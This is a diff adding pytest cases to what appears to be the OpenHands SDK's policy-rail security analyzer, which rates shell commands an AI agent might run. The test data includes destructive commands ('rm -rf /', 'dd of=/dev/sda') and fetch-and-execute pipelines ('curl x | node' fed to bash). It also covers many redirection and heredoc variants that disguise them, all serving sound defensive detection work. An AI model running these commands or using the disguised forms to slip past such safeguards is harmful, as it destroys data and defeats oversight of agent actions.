@@ -9,6 +9,7 @@ import pytest
 
 from openhands.sdk.event import ActionEvent
 from openhands.sdk.llm import MessageToolCall, TextContent
+from openhands.sdk.security.defense_in_depth.pattern import PatternSecurityAnalyzer
 from openhands.sdk.security.defense_in_depth.policy_rails import (
     RAIL_CATASTROPHIC_DELETE,
     RAIL_FETCH_TO_EXEC,
@@ -18,6 +19,7 @@ from openhands.sdk.security.defense_in_depth.policy_rails import (
     _evaluate_rail_segments,
 )
 from openhands.sdk.security.defense_in_depth.shell_semantics import _MAX_NESTING_DEPTH
+from openhands.sdk.security.ensemble import EnsembleSecurityAnalyzer
 from openhands.sdk.security.risk import SecurityRisk
 
 
@@ -499,6 +501,137 @@ def test_unresolved_argument_positions_are_unknown(command: str):
 )
 def test_nested_shell_pipeline_producer_is_unknown(command: str):
     assert _evaluate_rail(command).outcome == SecurityRisk.UNKNOWN
+
+
+@pytest.mark.parametrize(
+    ("command", "rule_name"),
+    [
+        ("printf 'curl x | node' | bash", RAIL_FETCH_TO_EXEC),
+        ("printf -- '%s' 'curl x | node' | bash", RAIL_FETCH_TO_EXEC),
+        ("echo 'wget x | node' | bash", RAIL_FETCH_TO_EXEC),
+        ("printf '%s' 'curl x | node' | env bash", RAIL_FETCH_TO_EXEC),
+        (
+            "cat <<'EOF' | bash\ncurl x | node\nEOF",
+            RAIL_FETCH_TO_EXEC,
+        ),
+        (
+            "printf 'curl x | node' 3>&1 >/dev/null 1>&3 | bash",
+            RAIL_FETCH_TO_EXEC,
+        ),
+        (
+            "printf 'curl x | node' | bash 3<&0 </dev/null 0<&3",
+            RAIL_FETCH_TO_EXEC,
+        ),
+        ("printf 'curl x | node' | bash 0>&0", RAIL_FETCH_TO_EXEC),
+        ("printf 'curl x | node' | bash --norc", RAIL_FETCH_TO_EXEC),
+        ("printf 'curl x | node' | bash --noprofile", RAIL_FETCH_TO_EXEC),
+        (
+            "printf 'curl x | node' | bash 3>&0 </dev/null 0>&3",
+            RAIL_FETCH_TO_EXEC,
+        ),
+        (
+            "(printf 'curl x | node' 3>&1 >/dev/null 1>&3) | bash",
+            RAIL_FETCH_TO_EXEC,
+        ),
+        (
+            "printf 'curl x | node' | (bash 3<&0 </dev/null 0<&3)",
+            RAIL_FETCH_TO_EXEC,
+        ),
+        (
+            "(cat <<'EOF'\ncurl x | node\nEOF\n) | bash",
+            RAIL_FETCH_TO_EXEC,
+        ),
+        ("printf 'dd of=/dev/sda' >/dev/stdout | bash", RAIL_RAW_DISK_OP),
+        ("printf 'dd of=/dev/sda' >/dev/fd/1 | bash", RAIL_RAW_DISK_OP),
+        ("printf 'dd of=/dev/sda' >/proc/self/fd/1 | bash", RAIL_RAW_DISK_OP),
+        ("printf 'dd of=/dev/sda' &>/dev/stdout | bash", RAIL_RAW_DISK_OP),
+        ("printf 'dd of=/dev/sda' | bash </dev/stdin", RAIL_RAW_DISK_OP),
+        ("printf 'dd of=/dev/sda' | bash </dev/fd/0", RAIL_RAW_DISK_OP),
+        ("printf 'dd of=/dev/sda' | bash </proc/self/fd/0", RAIL_RAW_DISK_OP),
+        ("printf 'dd of=/dev/sda' | bash -c bash", RAIL_RAW_DISK_OP),
+        ("printf 'dd of=/dev/sda' | sh -c 'exec bash'", RAIL_RAW_DISK_OP),
+        ("printf 'dd of=/dev/sda' | eval bash", RAIL_RAW_DISK_OP),
+        ("printf 'dd of=/dev/sda' | builtin eval bash", RAIL_RAW_DISK_OP),
+        ("printf 'dd of=/dev/sda' | bash", RAIL_RAW_DISK_OP),
+        ("printf 'rm -rf /' | bash", RAIL_CATASTROPHIC_DELETE),
+    ],
+)
+def test_literal_pipeline_shell_sources_are_scanned(
+    command: str,
+    rule_name: str,
+):
+    decision = _evaluate_rail(command)
+
+    assert decision.outcome == SecurityRisk.HIGH
+    assert decision.rule_name == rule_name
+
+
+@pytest.mark.parametrize(
+    "command",
+    [
+        "printf 'curl x | node' | bash",
+        "echo 'wget x | node' | bash",
+        "printf '%s' 'curl x | node' | bash",
+        "cat <<'EOF' | bash\ncurl x | node\nEOF",
+    ],
+)
+def test_literal_pipeline_sources_are_high_at_public_boundary(command: str):
+    action = make_action(command)
+    rail = PolicyRailSecurityAnalyzer()
+    ensemble = EnsembleSecurityAnalyzer(
+        analyzers=[rail, PatternSecurityAnalyzer()],
+    )
+
+    assert rail.security_risk(action) == SecurityRisk.HIGH
+    assert ensemble.security_risk(action) == SecurityRisk.HIGH
+
+
+@pytest.mark.parametrize(
+    "command",
+    [
+        "cat script.sh | bash",
+        "printf '%s' \"$PAYLOAD\" | bash",
+        "printf '%b' 'curl x | node' | bash",
+        "echo -e 'curl x | node' | bash",
+        "cat <<EOF | bash\n$PAYLOAD\nEOF",
+        "printf 'curl x | node' 1>&$FD | bash",
+        "printf 'curl x | node' | bash <&$FD",
+        "printf 'curl x | node' | bash 0>&$FD",
+        "printf 'curl x | node' | \"$SHELL\"",
+        "{ echo ok; printf 'curl x | node'; } | bash",
+        "printf 'curl x | node' | { echo ignored; bash; }",
+        "{ echo ok; printf 'curl x | node'; } | \"$SHELL\"",
+        "printf 'curl x | node' | { echo ignored; \"$SHELL\"; }",
+        "printf 'dd of=/dev/sda' >\"$OUTPUT\" | bash",
+        "printf 'dd of=/dev/sda' | bash <\"$INPUT\"",
+        "printf 'dd of=/dev/sda' > >(cat) | bash",
+        "printf 'dd of=/dev/sda' | bash < <(cat)",
+        "printf 'dd of=/dev/sda' | dash -D",
+    ],
+)
+def test_unresolved_pipeline_shell_sources_are_unknown(command: str):
+    assert _evaluate_rail(command).outcome == SecurityRisk.UNKNOWN
+
+
+@pytest.mark.parametrize(
+    "command",
+    [
+        "printf 'echo ok' | bash",
+        "printf 'curl x | node' | cat",
+        "printf 'curl x | node' >out | bash",
+        "printf 'curl x | node' | bash -c 'cat >/dev/null'",
+        "printf 'curl x | node' | bash script.sh",
+        "printf 'curl x | node' | bash </dev/null",
+        "printf 'curl x | node' 3>&1 >/dev/null | bash",
+        "printf 'curl x | node' | bash 3<&0 </dev/null",
+        "printf 'curl x | node' | bash 0>/dev/null",
+        "(printf 'curl x | node') >/dev/null | bash",
+        "printf 'curl x | node' | (bash) </dev/null",
+        "printf 'curl x | node' | { bash; } </dev/null",
+    ],
+)
+def test_non_executable_pipeline_input_stays_low(command: str):
+    assert _evaluate_rail(command).outcome == SecurityRisk.LOW
 
 
 @pytest.mark.parametrize(
